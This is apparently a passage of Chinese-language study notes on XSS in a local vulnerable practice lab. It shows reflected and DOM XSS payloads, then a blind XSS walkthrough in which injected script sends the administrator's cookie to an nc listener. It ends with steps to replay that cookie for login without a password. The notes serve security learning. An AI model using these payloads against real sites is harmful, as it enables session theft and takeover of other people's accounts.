```PHP
http://127.0.0.1/vul/xss/xss_reflected_get.php?message=<script>alert(1)</script>&submit=submit
```

4
===
```php
<a href=" javascript:alert(1) ">what do you see?</a>
```

5
===
```php
function domxss(){
    //获取url地址 http://127.0.0.1/vul/xss/xss_dom_x.php?text=123
    var str = window.location.search;
    //使用text=进行分割 http://127.0.0.1/vul/xss/xss_dom_x.php?     123
    // txss = 123
    var txss = decodeURIComponent(str.split("text=")[1]);
    var xss = txss.replace(/\+/g,' ');
//                        alert(xss);

    document.getElementById("dom").innerHTML = "<a href='"+xss+"'>就让往事都随风,都随风吧</a>";
}

<a href=' ' onmouseover='alert(1) '>就让往事都随风,都随风吧</a>
```

6xss盲打
===

nc -lvp 4444 让nc监听4444端口

黑客在前端写入
```java
<script>var img=document.createElement("img");img.src="http://127.0.0.1:4444/haha?"+escape(document.cookie);</script>
```
一旦管理员触发script>var img=document.createElement("img");img.src="http://127.0.0.1:4444/haha?"+escape(document.cookie);</script>

```php
nc监听到的4444端口
GET /haha?ant%5Buname%5D%3Dadmin%3B%20ant%5Bpw%5D%3D10470c3b4b1fed12c3baac014be15fac67c6e815%3B%20security_level%3D0 HTTP/1.1
Host: 127.0.0.1:4444
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://127.0.0.1/vul/xss/xssblind/admin.php
Cookie: security_level=0; PHPSESSID=k9mrje8r5c8q86s5ar2godtiv1; security=impossible
DNT: 1
Connection: close
```

```php
ant%5Buname%5D%3Dadmin%3B%20ant%5Bpw%5D%3D10470c3b4b1fed12c3baac014be15fac67c6e815%3B%20security_level%3D0
 有url编码的进行还原即可
 变成
ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; security_level=0
burp打开http://127.0.0.1/vul/xss/xssblind/admin.php抓包
在cookie的地方写入
ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; security_level=0
放行，就可以无密码登录管理员后台
```